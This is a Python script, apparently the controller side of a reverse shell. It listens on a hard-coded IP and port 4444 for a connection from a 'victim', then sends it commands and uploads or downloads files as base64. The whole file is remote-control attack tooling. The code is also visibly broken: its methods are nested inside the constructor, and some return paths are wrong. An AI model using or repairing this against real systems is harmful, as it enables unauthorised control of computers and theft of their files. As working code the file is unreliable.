import socket
import json
import base64


class listen : 
    def  __init__(self , ip ,p ):
        l = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        l.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        l.bind((ip,p))
        l.listen(0)
        print("[.]waiting for incoming connections...")
        self.conn,self.ip_addr=l.accept()
        print("[+]got a connection from "+str(self.ip_addr[0])+"from port"+str(self.ip_addr[1]))


        def send_data(self,data):
            pack_data=json.dumps(data)
            self.conn.send(pack_data)

        def recv_data(self):
            pack_data=b''
            while True:

                try:
                    pack_data += self.conn.recv(1024)
                    return json.loads(pack_data)

                except ValueError:
                    continue


        def execute_at_victim(self, command):
            self.send_data(command)
            if command[0]== "exit":
                self.conn.close()
                exit() 
                return self.recv_data()

        def read_file(self,name):
            with open(name , "rb") as file: 
                return base64.b64encode(file.read())

        def write_file(self, name, content):
            with open(name, "wb") as file :
              file.write(base64.b64decode(content))
              return"[+] download successful"
        
        def start(self):
            while True:
                try:
                    command = input(">>")
                except:
                    command = input(">>")
                command = command.split(" ")
                try:
                    if command[0] == "upload":
                       content = self.read_file(command[1])
                       command.append(content) 
                    output = self.execute_at_victim(command)
                    if command[0] == "download" and "[-]" not in output:
                        output = self.write_file(command[1], output)
                except Exception:
                    output = "[-] ERROR, failed to execute command."
                     
                print(output)

try:
    listen = listen("192.168.131.188", 4444)
    listen.start()
except Exception:
    print("[-] Failed to start server.")



           
        